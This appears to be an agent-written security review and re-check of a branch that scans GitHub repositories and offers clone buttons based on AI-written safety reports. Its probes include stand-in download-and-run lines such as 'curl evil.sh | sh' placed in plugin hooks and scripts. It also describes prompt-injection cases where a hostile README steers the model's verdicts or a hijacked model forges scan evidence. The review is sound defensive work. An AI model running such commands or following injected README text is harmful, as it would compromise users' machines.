# T20 review (cloud reports) by T8: `agent/t20-reports` @ 645e5bc

Read `reelay/core/reports.py`, `reelay/cloud/report.py`, the `prepare.py`/`relay.py`/`app.ts` diffs and `routine/PROMPT.md`. Ran both suites: **pytest 508 pass, deno 21 pass**. Attacked the gate with a probe script (hostile JSON, URL tricks, symlinks, fake clones). Code not edited.

**Verdict: 1 BLOCKER, 3 FIX, 7 NIT.** Hostile JSON types, URL tricks, case tricks, symlinks and path traversal are all handled; the problems are in what "safe" is allowed to mean.

## Priority 1: can an `adopt_line` appear when it shouldn't?
Attacks that held: wrong types everywhere (lists/dicts/bools/NaN/str/None as report, type, identity, safety, usage, project) → no crash, UNSURE, no line. URL with `\n`, trailing `/`, `?x`, `%2f..`, `GitHub.com`, `github.com.`, `.git` → rejected. A symlink `SKILL.md`, symlinked `skills/` or `.claude/`, or a symlinked clone dir → `find_problem`/`_safe_dir` say NO/unknown, no evidence counted. Owner/repo can't escape `/tmp/trial` (chars are restricted, `.`/`..` refused, `rmtree` only on real dirs).

- **BLOCKER 1: a mod whose hooks run shell commands gets "safe YES" and a clone line.** Probe: clone with `hooks/hooks.json` = `curl evil.sh | sh` and `.claude-plugin/plugin.json` with hooks (or `scripts/steal.sh` run by a plugin hook) → `Is it safe? YES: The safety scan found nothing risky in the files.` + `git clone -- …` Adopt button. Cause: `type_evidence` accepts `hooks/` or `plugin.json` as proof of a mod, while `find_problem` only rejects `hooks:` in markdown frontmatter and `settings*.json`; it never looks at `plugin.json`, `hooks/*.json`, `commands/` or any script. A mod is by definition code that runs on the user's machine, so the scan is blind exactly where the risk is, and the text overclaims. Fix: for type `mod`, if `hooks/` exists, a manifest mentions `"hooks"`, or the repo has `.sh/.py/.js/.ts` files, cap safety at UNSURE with the reason "it contains hooks/scripts that would run on your computer; read them first" and give no clone line (or, if you want mods adoptable, show a fixed warning line and require the owner to tap twice). Add a test with the probe repo. Also reword "scan found nothing risky in the files" to "found none of the patterns I look for (hooks in skill files, symlinks, shell commands on load); I did not read scripts".
- **FIX 1: "safe YES" for a skill is only as strong as the model's YES plus that thin scan.** Probe: skill with `scripts/x.sh` = `curl evil|sh` → YES + clone line. The model's YES is attacker-influenceable (it just read the hostile README), so it adds nothing against injection; only the deterministic scan counts. Either state in the report that scripts were not scanned (when the clone contains any executable-looking file, say "contains scripts, not scanned") or downgrade to UNSURE when a skill has `scripts/` or any `.sh/.py/.js` at all.
- **FIX 2: the evidence is written by the model and checked later; the clone is installed later still.** `report` scans `/tmp/trial/<owner>__<repo>` that the model created (it can put any files there), and trusts `bundle.json` (`github_links`, `owner_supplied`) that sits in a folder the model can write. A hijacked model can therefore forge "clean + confirmed", and even an honest run can be stale: the user later clones the live repo tip, not what was scanned. Cheap fixes: (a) let `report.py` do the `git clone --depth 1` itself (it is code, not the model) and drop the model's clone; (b) print the scanned commit in the message (`git -C <clone> rev-parse HEAD`, shown as "scanned commit abc1234") so the user can check; (c) write the doc line that the gate protects against model mistakes and weak injection, not a fully hijacked routine (which can also `curl /api/send` with any `github.com/o/r` line, since the relay's `ADOPT_RE` is the only check there).

## Priority 2: identity
- **Exact, not loose: OK.** `confirmed` is a set of lowercase `owner/repo` strings and the test is set membership. Probe: claimed `evil/repo` with only `evil/repo-extra` in the video → no line, UNSURE. `Evil/Repo` vs `evil/repo` correctly counts as the same (GitHub is case-insensitive).
- **FIX 3: lookalike domains confirm too.** `_GH_BARE` starts with `\b`, so `https://evil-github.com/owner/legit` (or `my-github.com/…`) is read as `github.com/owner/legit`. Probe: `confirmed == {'owner/legit'}`. Impact is small (the repo is still a real github.com one, named in the video), but "a link in the video" is not what happened. Use `(?<![\w.-])` before `(?:www\.)?github\.com`, and note that any mention counts, including "don't use github.com/x/y".
- NIT: tighten the owner part everywhere (`_REPO`, `_GH_LINK`, `_GH_BARE`, relay `ADOPT_RE`) to GitHub's real rule `[A-Za-z0-9-]+`. Today `a/b__c` and `a__b/c` map to the same clone dir `a__b__c` (probe), and the relay's `[\w.-]+` accepts `..` or a leading `-`/`_` as the final gate.

## Priority 3: relay
- `/projects` and `/report` sit in `ownerMessage`, which only runs after the owner check, and both run before any rate-limit key or routine fire (`/report` format failure also returns before the fire). OK.
- `GET /api/profile` returns `{...prof, projects}` with `projects` last, so a stale `projects` key in the stored profile can't win; `PUT` deletes `projects` before storing; the routine's `put_profile` doesn't send it. OK.
- Daily budget uses `kv.atomic().check(cur)`, so two sends can't both take the last slot. NIT: `for(;;)` has no retry cap; the flag `report: true` is set by the caller, so a caller that omits it isn't counted (fine while the routine is trusted).
- One tap = one candidate: each `/api/send` stores its own line under its own random id; the test covers two reports. OK.
- NIT: `daily = "429" in str(e)` relies on the `RelayError` text (`relay answered 429 …`); fine today, brittle if the message changes.

## Priority 4: `routine/PROMPT.md`
- **Clone limits are missing.** Up to 9 clones with plain `git clone --depth 1`: no size/time cap (`timeout 60`, `--filter=blob:limit=1m`), no `GIT_TERMINAL_PROMPT=0`, `GIT_LFS_SKIP_SMUDGE=1`, `-c protocol.allow=never` like `sandbox/fetch.py` does. One huge repo or an LFS repo can eat the 20-minute run. Add them to the clone command. Also say "https://github.com URLs only", since the model picks the URL.
- Reading 9 READMEs (20 KB each) plus SKILL.md into one context makes one hostile README able to steer the other eight reports (e.g. mark another repo YES/NO). The rules say "data", which is right, but a stronger step is one repo per sub-task, or at least "write each report from that repo's text only". Since model YES can't raise the deterministic result, this mostly matters for the type, `what`/`pros` text and NO/UNSURE flips.
- The data-not-instructions rules still cover repos, READMEs, file lists and the project list. OK.

## Other NITs
- `_build` dedupes by exact URL, so `…/A/B` and `…/a/b` give two reports (and two clone dirs) for one repo; dedupe on `owner_repo.lower()`.
- `reports.plain` and `_CTRL` don't strip bidi overrides (U+202A–202E, U+2066–2069, U+200E/F, U+061C); same fix as T12.
- `repo_parts` rejects `.git` but not `.GIT`; harmless, make it case-insensitive.
- A big legitimate app/mod over 2000 files or 50 MB gets "Is it safe? NO … I recommend Skip" from `find_problem`'s size rule; wording should say "too big to scan", not "risky".

---

## Re-check by T8 (`agent/t20-reports` @ 92952a2, only what changed)

Suites: Python **533 passed**, Deno **23 passed**. Probes in my scratchpad (`probe20b.py`), no code edited.

**Closed**
- BLOCKER / FIX 1-3 / prompt limits: closed. Mod with `hooks.json` now gives UNSURE + `has_code` (was YES + line).
- Adopt for code-bearing skills/mods (owner's choice): a detected-code repo can't say YES: model YES/UNSURE both end UNSURE, with warning + files + commit; model NO -> NO, no line. Wrong identity (not in confirmed set), failed clone, too-large, symlink-in-clone -> **no line**.
- `report.py` own clone: `check_url`, `protocol.allow=never` (https only), hooksPath off, fsmonitor off, LFS off, depth 1, minimal env, `--` before the URL; ignores the model's clone.
- Claim sources vs candidates: probed. Cloud: an unresolvable claim source is kept (shape-only: http, userinfo, IP literals, localhost, `.internal`, ports, single-label hosts all rejected). An unresolvable candidate (`ghost.example.net`) and `metadata.google.internal` / `127.0.0.1` candidates are **dropped**; the full DNS check on candidates holds. Local path still drops the unresolvable claim source (verdict unverified).
- `saw_line`: clamps >total to total, negatives to 0, and bool/str/float/inf/nan/None/list give "12 frames extracted, number viewed not reported". Can't overstate.
- `/goals`: owner gate (stranger test), handled before any routine fire, caps 5 x 300 (6 lines and 301 chars rejected, old goals kept), `PUT /api/profile` deletes `goals`/`projects` so it can't erase or set them. Covered by test at `relay/app_test.ts:384`.

**Still open**
- **FIX A (small, before the demo repo scan):** `find_code` misses code that a model-YES skill/mod can still carry, and these all give YES + Adopt line (probed):
  - extensionless shebang or exec-bit files (`bin/run`, `install`, `tool`),
  - `.mcp.json` and `plugin.json` with `mcpServers` (runs a `command` when installed; `_MANIFESTS` only looks for `"hooks"`),
  - `Makefile`, `*.so`/binaries.
  Fix: also flag any file with the owner-exec bit or a `#!` first line, any manifest containing `"mcpServers"` / `"command"`, `.mcp.json` itself, `Makefile`, and ELF/Mach-O magic (or simply any non-text file outside a small image/doc allowlist). Add tests for each.
- NIT: clone `timeout` kills `git` but not `git-remote-https` children (use `start_new_session` + kill the group). Size cap is checked after the clone, so a huge repo can still fill the routine's disk (add `GIT_` size guard or `--filter=blob:limit`).

**Verdict:** approved for everything in the re-check list except FIX A. Adopt can't say YES for any code the scan detects, but the scan has the gaps above, so the "can't say YES" promise is not fully true yet.
